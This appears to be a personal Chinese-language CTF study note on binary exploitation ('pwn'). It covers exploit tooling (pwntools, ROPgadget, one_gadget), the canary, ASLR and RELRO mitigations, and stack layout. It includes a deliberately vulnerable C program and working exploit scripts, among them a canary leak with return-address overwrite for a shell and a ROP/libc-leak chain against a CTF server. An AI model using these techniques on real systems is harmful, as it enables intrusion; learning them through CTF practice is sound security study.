- writer: github.com/hex-16   data: from 2020   contact: hexhex16@outlook.com  recommended viewer/editor: Typora
- 未加说明时，默认系统为kali 20.04(64bit), python3.7或以上, 其余套件为2021前后的最新版
- 部分内容与 Reverse.md 有重叠/交叉，会有注明。其中动态调试如何使用优先记录在 Reverse.md 

# Pwn

> spelled "pone". like "p" own
>
> pwn的源起以及被广泛地普遍使用的原因：魔兽争霸某段讯息上设计师打字时拼错，原本应是own。 'p' 与 'o' 在标准英文键盘上位置相邻

- pwn是一个骇客语法的俚语词，自"own"这个字引申出来的
- 在计算机技术领域，pwn一般指攻破(to compromise, 危及, 损害)，或是控制(to control)



- vulnerability: 脆弱性，计算机安全隐患，易损点，弱点。

```cpp
_rdtsc() // 检测程序运行需要多少个CPU周期
```





## checksec

> https://github.com/slimm609/checksec.sh

`checksec` Installation

- 实际上有些app, module已经包含`checksec`, e.g. miniconda3, pwntools

```bash
git clone https://github.com/slimm609/checksec.sh
cd checksec.sh
chmod 777 ./checksec
env | grep PATH # 查看系统路径包含哪些
sudo cp ./checksec /usr/bin # 这里的路径是上面 PATH 中出现的其中一个 # 只要是 PATH 中出现过的路径都可以
```

```bash
checksec filename  # 使用方法（旧版）
checksec --file=filename  # 新版
```



## one\_gadget

> https://github.com/david942j/one_gadget

- Installation: 

```bash
sudo apt install ruby
gem install one_gadget
one_gadget libc-2.27.so
one_gadget libc-2.27.so --near exit,mkdir # Reorder gadgets according to the distance of given functions.
one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near 'write.*' --raw # Regular expression is acceptable.
one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near spec/data/test_near_file.elf --raw # Pass an ELF file as the argument, OneGadget will take all GOT functions for processing.
```



```python
import subprocess
def one_gadget(filename):
	return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

one_gadget('/lib/x86_64-linux-gnu/libc.so.6')
#=> [324293, 324386, 1090444]
```





## gef

> gef github:   https://github.com/hugsy/gef 
>
> 切换pwndbg,peda,gef:    https://www.jianshu.com/p/94a71af2022a

- `GEF` (pronounced ʤɛf - "Jeff") is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development.
- Installation:
  1. 访问 http://gef.blah.cat/py  ，将其内容保存到文件`~/.gdbinit-gef.py`中
  2. `echo source ~/.gdbinit-gef.py >> ~/.gdbinit`. 

- 使用gef:  `echo "source ~/.GdbPlugins/gef/gef.py" > ~/.gdbinit`, 然后`~/.gdbinit`内容如下，gdb启动后为使用gef，显示`gef➤ `

```bash
source /home/kali/.gdbinit-gef.py
```





## pwndbg

> https://github.com/pwndbg/pwndbg
>
> https://blog.csdn.net/Breeze_CAT/article/details/103789233  指令参考

Installation:

1. `git clone https://github.com/pwndbg/pwndbg`
2. `cd pwndbg`
3. `chmod 777 ./setup.sh`
4. `./setup.sh`

- 安装完成后，使用`gdb`指令后，命令行左侧显示的是`pwndbg`

> 如何使用pwndbg见 Reverse.md. Dynamic Analysis: pwndbg
>
> 实践使用案例见对应writeup

- 在显示stack的时候 中间会有省略 暂时不知道有什么方法能去掉中间省略的部分，有时会影响栈分析，考虑换用gef



## pwntools

> python包    Github repo: https://github.com/Gallopsled/pwntools
>
> docs: https://docs.pwntools.com/en/latest/

- pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API名称/行为改变

```python
from pwn import *
context.log_level = "DEBUG"
context.binary = ""./pwny" # print(context)

# ===== 连接
sh = remote("127.0.0.1", 32152) # 与互联网主机交互
sh = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
sh = process("./bin")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)


# =====elf 
libc = ELF("./libc.so.6")
elf = ELF("./login")


# ===== 发送
sh.send("hello") # 不会添加回车
sh.sendline("hello") # sendline发送数据会在最后多添加一个回车
sh.sendafter(">", payload) # 在接收到 > 后发送


# ===== 接收
sh.recv(1024) # 读取1024个字节

sh.recvuntil() # 读取一直到回车
sh.recvuntil("end\n") # 读取一直到 end\n
sh.recvuntil(b' ', drop=True) # b'331'

sh.recvline()
sh.recvline(timeout=1) # 超时为1s
sh.recvline("hello") # 读取到指定数据
sh.recvline(keepends=False) # 不保存尾部截断字符

sh.interactive()
```



```python
sh.p32(0xdeadbeef)
sh.p64(0xdeadbeefdeadbeef)
sh.u32("1234")
sh.u64("12345678")
# 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 64bit OS接收函数地址 补全 转换

import struct
p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
leet = unhex('37130000')
u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
u8(b'A') == 0x41 # True # 两者等效
```

- Installation: 

> (2021.3) 官方文档建议使用python3

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```



> https://docs.pwntools.com/en/latest/intro.html
>
> 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html





### Connections



```python
# There’s even an SSH module for when you’ve got to SSH into a box to perform a local/setuid exploit with pwnlib.tubes.ssh. You can quickly spawn processes and grab the output, or spawn a process and interact with it like a process tube. # ssh连接
shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
shell['whoami'] # b'bandit0'
shell.download_file('/etc/motd')
sh = shell.run('sh')
sh.sendline(b'sleep 3; echo hello world;') 
sh.recvline(timeout=1) # b''
sh.recvline(timeout=5) # b'hello world\n'
shell.close()
```





### Target Architecture, OS, Logging, Assembly

```python
asm('nop') # b'\x90'
asm('nop', arch='arm') # b'\x00\xf0 \xe3'
# set once in the global `context`
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
```

```python
# asm context 方法对比
asm('nop') # b'\x90'
context(arch='arm', os='linux', endian='big', word_size=32)
asm('nop') # b'\xe3 \xf0\x00'
```

```python
# set logging level
context.log_level = 'debug'
log.success("ret_addr:" + hex(ret_addr)) # success logging 
```

> `pwnlib.asm`

```python
enhex(asm('mov eax, 0')) # 'b800000000'  # assembly to machine code # 汇编转机器码(hex)
print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
# Output: 
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```





### ELF Manipulation

```python
e = ELF('/bin/cat')
print(hex(e.address)) #doctest: +SKIP # 0x400000
print(hex(e.symbols['write'])) #doctest: +SKIP # 0x401680
print(hex(e.got['write'])) #doctest: +SKIP # 0x60b070
print(hex(e.plt['write'])) #doctest: +SKIP # 0x401680

# patch and save the files # 打补丁并保存
e = ELF('/bin/cat')
e.read(e.address, 4) # b'\x7fELF'
e.asm(e.address, 'ret') # 将 e.address 地址处的汇编改为 ret
e.save('/tmp/quiet-cat')
disasm(open('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```



### Cases

> 这里列举的代码通常去掉了很多功能重复的语句，一般无法直接运行也无法解题

```python
from pwn import *   # ROP_double_leave_tiny_rop_GKCTF2021_checkin # truncated

context.log_level = "DEBUG"
context.binary = './login'
# sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)
sh = remote("node3.buuoj.cn", 27490)
libc = ELF("./libc.so.6")
elf = ELF("./login")
gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")

payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)

data = sh.recvuntil("GeBai\n")
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 注意这里接收64bit系统函数地址后的操作
libc.address = addr_puts - libc.sym['puts']
print("libc.address =", hex(libc.address))

payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247) # one_gadget: 0x45226 0x4527a 0xf03a4 0xf1247
sh.sendafter(">", payload)

sh.interactive()
```





## ROPgadget

> https://github.com/JonathanSalwan/ROPgadget
>
> ROPgadget v6.5 installation test on Kali 20.04, 2021.3

```bash
sudo pip install capstone
pip install ropgadget
# 添加至$PATH :  /usr/local/lib/python3.9/dist-packages/bin # 路径的可能值
ROPgadget --help # 选项及使用案例
ROPgadget -v
Version:        ROPgadget v6.5 # 测试时的最新版
Author:         Jonathan Salwan
Author page:    https://twitter.com/JonathanSalwan
Project page:   http://shell-storm.org/project/ROPgadget/

ROPgadget.py [-h] [-v] [-c] [--binary <binary>] [--opcode <opcodes>]
                    [--string <string>] [--memstr <string>] [--depth <nbyte>]
                    [--only <key>] [--filter <key>] [--range <start-end>]
                    [--badbytes <byte>] [--rawArch <arch>] [--rawMode <mode>]
                    [--rawEndian <endian>] [--re <re>] [--offset <hexaddr>]
                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]
                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]
                    [--dump] [--silent] [--align ALIGN]
```



```bash
ROPgadget --binary ret2baby  --only 'pop|ret' | grep 'eax' # 寻找控制 eax 的 gadgets
ROPgadget --binary ret2baby  --only "int" # 找 int xxx 的地址
ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应的地址

```



# Anti-Pwn





## Canary

> 栈的警惕标志 stack canary
>
> 金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的，预警用的金丝雀
>
> 这里指解决栈溢出问题的一种漏洞缓解措施。编译器层级

- 在栈的返回地址的存储位置之前放置一个整形值，该值在装入程序时随机确定。栈缓冲区攻击时从低地址向高地址覆盖栈空间，因此会在覆盖返回地址之前就覆盖了警惕标志。返回前会检查该警惕标志是否被篡改，判断 stack/buffer overflow 是否发生
- 通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的
- 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)
- 攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将这种 cookie 信息称为 Canary
- 由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在
- Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配



### Canary theory

- 在GCC中使用以下参数设置 Canary

```bash
-fstack-protector # 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all # 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit # 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector # 禁用保护
```

- 开启 Canary 保护的 stack 结构大概如下：

```assembly
        High                              ; +8 for 64bit
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
      rbp+8 =>  | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address
```

当程序启用 Canary 编译后，在**函数序言**部分会取 fs 寄存器 0x28 处的值，存放在栈中 `%ebp-0x8` 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：

```assembly
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```assembly
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

> FS寄存器 https://www.cnblogs.com/feiyucq/archive/2010/05/21/1741069.html 所述内容与本节所述的FS寄存器的貌似有些不同？

如果 Canary 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。

```c
// eg libc-2.19/debug/stack_chk_fail.c
void __attribute__ ((noreturn)) __stack_chk_fail (void){
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容 (参见 stack smash)。

对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。

```c
typedef struct{
  void *tcb;   // Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.
  dtv_t *dtv;
  void *self;  // Pointer to the thread descriptor.
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```

如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。

事实上，TLS 中的值由函数 security_init 进行初始化

```c
static void
security_init (void){
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```





### Canary Bypass

> Canary 绕过

Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。



- 示例代码：`gcc -m32 -no-pie -fstack-protector-all ex2.c -o ex2`

```c
// ex2.c # 编译为 32bit 程序并关闭 PIE 保护 （并开启 NX，ASLR，Canary 保护）
// gcc -m32 -no-pie -fstack-protector-all canary_demo.c -o ex2
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```



![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_canary_function_demo.png)

- 上图为IDA中显示的`vuln`函数的汇编指令。`var_C`为canary值

```assembly
; Stack of vuln ; Two special fields " r" and " s" represent return address and saved registers.
-00000075                 db ? ; undefined
-00000074 var_74          dd ?
-00000070 buf             db 100 dup(?)           ; string(C)
-0000000C var_C           dd ? ; 这个就是canary值 # 4 byte
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004 var_4           dd ? ; 原本寄存器 ebx 的值
+00000000  s              db 4 dup(?) ; 从上图左边绿色的栈高度可以看出，s是原本的 ebp 的值
+00000004  r              db 4 dup(?) ; 函数的返回地址
+00000008
+00000008 ; end of stack variables
```





#### Leak Canary

> 泄露栈中的

- Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串。
- 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。
- 这种利用方式需要存在合适的输出函数，并且可能需要先溢出泄露 Canary，之后再次溢出控制执行流程。

```python
#!/usr/bin/env python
from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2') # pwnlib.tubes.process.process
get_shell = ELF("./ex2").sym["getshell"]
print("get_shell:", type(get_shell), hex(get_shell)) # get_shell: <class 'int'> 0x80491b2
ret = io.recvuntil("Hello Hacker!\n") # <class 'bytes'> b'Hello Hacker!\n'

# leak Canary
payload = b"A" * 100 # buf[100] in .c, lead to stack overflow
io.sendline(payload) # pwnlib.tubes.tube.tube.sendline # 这里会以\n结尾 即 0xa # 总共发送的payload长度为 101 bytes
io.recvuntil("A" * 100) # recv output of printf(buf) in .c
recv_v = io.recv(4)

# 这里减去0xa是为了减去上面 io.sendline(payload) 最后的换行符，得到真正的 Canary
Canary = u32(recv_v) - 0xa 
log.info("Canary:" + hex(Canary))

# Bypass Canary
# as the stack shown in IDA: [buf 100byte]-[var_C]-[12byte]-[return_address]
payload = b"\x90" * 100 + p32(Canary) + b"\x90" * 12 + p32(get_shell)
payload = b"a" * 100 + p32(Canary) + b"a" * 12 + p32(get_shell)
io.send(payload)

io.recv()

io.interactive() # 将代码交互转换为手工交互
```

运行结果：调用`vuln`函数的返回值被覆盖为`getshell`的函数地址，可以获得所在主机的稳定shell

 ```assembly
$ python canary.py
[*] '/home/kali/CTF/pwn/ex2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './ex2': pid 10221
get_shell: <class 'int'> 0x80491b2
[*] Canary:0xa5b35f00       ; 注意这里的值已经是将canary最后一个byte恢复成\x00后的原本的canary值了
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ ls  ; 这里已经获取了 shell 用ls测试
ex2.c  canary.py  core    ex2
 ```

 如果使用`context.log_level = 'debug'`, `io.sendline(b"A" * 100)`之后的输出如下：

 ```assembly
[DEBUG] Received 0x6c bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  0a 5f b3 a5  10 a0 04 08               │AAAA│·_··│····│    ; 注意这里 0a 5f b3 a5 就是canary+0xa的值
 ```

 `0a 5f b3 a5`包含了101bytes的最后一个字符`\n`(0xa)，所在Linux系统为小端序，所以被覆盖的是canary的最后一个byte。而前面提到了canary值被设计以`\x00`结尾，所以这里需要将canary最后一个字节从`\x0a`恢复到原本的`\x00`



#### one-by-one 爆破 Canary

> 逐位爆破canary



#### 劫持`__stack_chk_fail` 函数





#### 覆盖 TLS 中储存的 Canary 值







## ASLR

> 地址空间配置随机加载  Address space layout randomization  地址空间配置随机化  地址空间布局随机化
>
> OS层级的保护。一种防范内存损坏漏洞被利用的计算机安全技术
>
> Linux系统上控制ASLR启动与否

- ASLR通过**随机放置进程关键数据区域的地址空间**来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行**Return-to-libc**攻击
- ASLR 的有效性依赖于整个地址空间布局是否对于攻击者保持未知。只有编译时作为 位置无关可执行文件(Position Independent Executable) **PIE** 的可执行程序才能得到 ASLR 技术的最大保护，因为只有这样，可执行文件的所有代码节区才会被加载在随机地址。PIE 机器码不管绝对地址是多少都可以正确执行。



ASLR绕过方法：

- 利用地址泄露
- 访问与特定地址关联的数据
- 针对 ASLR 实现的缺陷来猜测地址，常见于系统熵过低或 ASLR 实现不完善。
- 利用侧信道攻击



修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：

- 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
- 1: 普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化
- 2: 增强的 ASLR，在 1 的基础上，增加了堆基地址随机化







### Settings

查看ASLR是否开启

```bash
$ cat /proc/sys/kernel/randomize_va_space
2
$ sysctl -a --pattern randomize
kernel.randomize_va_space = 2
```

关闭ASLR

```bash
echo 0 > /proc/sys/kernel/randomize_va_space # 关闭Linux系统的ASLR
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space" # kali20.04测试时需用
sudo sysctl -w kernel.randomize_va_space=0    <== disable
```


关闭ASLR时，两次ldd的输出值一样。`ldd` 命令会加载共享对象并显示它们在内存中的地址。但是开启ASLR后，每次ldd的输出都不通

```bash
kernel.randomize_va_space = 0 # 关闭了ASLR
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
```

```bash
kernel.randomize_va_space = 2 # 开启增强的ASLR
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007fff47d0e000) # first set of addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f1cb7ce0000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1cb7cda000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1cb7af0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1cb8045000)
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffe1cbd7000) # second set of addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fed59742000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fed5973c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fed59552000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fed59aa7000)
```









## RELRO

> Relocation Read-Only
>
> 编译器层级的保护
>
> https://blog.csdn.net/ylcangel/article/details/102625948

- a security measure which makes some binary sections read-only
- 默认情况下应用程序的导入函数只有在调用时才去执行加载（所谓的懒加载，非内联或显示通过dlxxx指定直接加载），如果让这样的数据区域属性变成只读将大大增加安全性
- RELRO是一种用于加强对 binary 数据段的保护的技术，大概实现由linker指定binary的一块经过dynamic linker处理过relocation之后的区域为只读，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击

有三种状态：

1. 不开启RELRO
2. 部分RELRO
3. 完全RELRO

```bash
gcc -o test test.c # 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c # 关闭，即No RELRO
gcc -z lazy -o test test.c # 部分开启，即Partial RELRO
gcc -z now -o test test.c # 全部开启，即Full RELRO
```



Partial RELRO: 现在gcc 默认编译就是 partial relro

1. some sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loader
2. non-PLT GOT is read-only (.got)
3. GOT is still writeable (.got.plt)

Full RELRO: 

1. 拥有 Partial RELRO 的所有特性
2. lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析
3. bonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover, since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized. GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function。

---

# The Function Stack

> 函数调用栈
>
> related registers: ESP, EBP, EIP...            
>
> https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html

CPU在执行call指令时需要进行两步操作：

1. 将当前的IP(也就是函数返回地址)入栈，即：`push IP`; 对ESP/RSP/SP寄存器减去4/8 然后将操作数写到上述寄存器里的指针所指向的内存中。
2. 跳转，即： `jmp dword ptr 内存单元地址`。

`ret`指令相当于`pop IP`, CPU在执行`ret`指令时只需要恢复IP。从栈指针ESP/RSP/SP指向的内存中读取数据，(通常)写到其他寄存器里，然后将栈指针加上4/8

32bit系统：

- ESP: 栈指针寄存器(extended stack pointer), ESP永远指向系统栈最上面一个栈帧的栈顶(低地址)。注意指向的是**栈顶元素的地址**，而**不是下一个空闲地址**。ESP寄存器是固定的，只有当函数的调用后，发生入栈操作而改变。通常情况下ESP是可变的，随着栈的生产而逐渐变小，用EBP来标记栈的底部
- EBP: 基址指针寄存器(extended base pointer), EBP永远指向系统栈最上面一个栈帧的底部(高地址)。

intel系统中栈是向下生长的(栈越扩大其值越小,堆恰好相反)

通过固定的地址与偏移量来寻找在栈参数与变量，EBP寄存器存放的就是固定的地址。但是这个值在函数调用过程中会变化，函数执行结束后需要还原，因此要在函数的出栈入栈中进行保存

## Push Order

> 入栈顺序

以**Windows/Intel**为例，通常当函数调用发生时，数据将以以下方式存储在栈中：

1. **函数参数从右往左入栈**。The function parameters are pushed on the stack before the function is called. The parameters are pushed from right to left.
2. **x86 call**指令将**返回地址**入栈，返回地址存储的是**当前EIP寄存器的值**。The function **return address** is placed on the stack by the x86 CALL instruction, which stores the current value of the EIP register.
3. caller的**栈帧基址EBP**入栈。Then, the frame pointer that is the previous value of the EBP register is placed on the stack.
4. 如果函数有try/catch或其他**异常处理结构**，编译器会将异常处理信息入栈。If a function includes try/catch or any other exception handling construct such as SEH (Structured Exception Handling - Microsoft implementation), the compiler will include exception handling information on the stack.
5. **局部声明的变量**。Next, the locally declared variables.
6. 将缓冲区分配给**临时数据**存储。Then the buffers are allocated for temporary data storage.
7. 存储在callee会被使用的**寄存器**（对于**Linux/intel，该步在Step 4 后**，局部声明变量前）。Finally, the callee save registers such as ESI, EDI, and EBX are stored if they are used at any point during the functions execution. For Linux/Intel, this step comes after step no. 4. 

**Linux/Intel 入栈顺序**：

1. **实参N\~1**
2. **返回地址**，当前EIP寄存器的值
3. caller帧基指针**EBP**
4. 异常处理信息
5. callee中会用到的**寄存器**
6. callee**局部变量1\~N**

## Memory Layout 内存布局

- 函数调用栈的典型内存布局（Linux/Intel, x86-32bit）如下所示。包含caller和callee，包含寄存器和临时变量的栈帧布局。注意这里的Called-saved Registers的位置是**Linux/Intel**的

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_function_stack_caller_and_callee.jpg)

- `m(%ebp)`表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)
- 该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于`12(%ebp)` 处；第二，每个参数都是4字节大小(栈的粒度为4字节)
- 函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分



- 结构体成员变量的入栈顺序与其在结构体中声明的顺序相反
- **局部变量的布局依赖于编译器实现等因素。局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中**。
- 数组/结构体型的局部变量通常分配在栈内存中

> 局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。
>
> 基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义



**Examples**

> https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html

- 许多编译器使用帧指针（FP，Frame Pointer）来引用局部变量和参数，FP的值不随push, pop改变。在Intel cpu上，EBP用作FP

```cpp
#include <stdio.h>  // https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html  // 32bit
int MyFunc(int parameter1, char parameter2){ // 取这两个参数时，相对EBP的偏移量为正
	int local1 = 9;
	char local2 = 'Z';
    return 0;
}
int main(int argc, char *argv[]){
	MyFunc(7, '8'); // 参数从右向左压栈，push '8'; push 7 // 然后将EIP入栈，此时EIP指向main函数的下一个要执行的指令，即call指令以后的
	return 0;
}
```

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/RE_function_call_function_stack_layout.png)

## x64

> 相信内容见reverse.md中的 *6. printf()函数与参数传递*

- \*nix x64系统先使用RDI, RSI, RDX, RCX, R8, R9寄存器传递前6个参数，然后利用栈传递其余的参数
- Win64使用RCX, RDX, R8, R9寄存器传递前4个参数，使用栈来传递其余参数

---

# Calling Convention

> 函数调用约定  Calling Convention  调用规范  调用协定  调用约定

函数调用约定通常规定如下几方面内容：

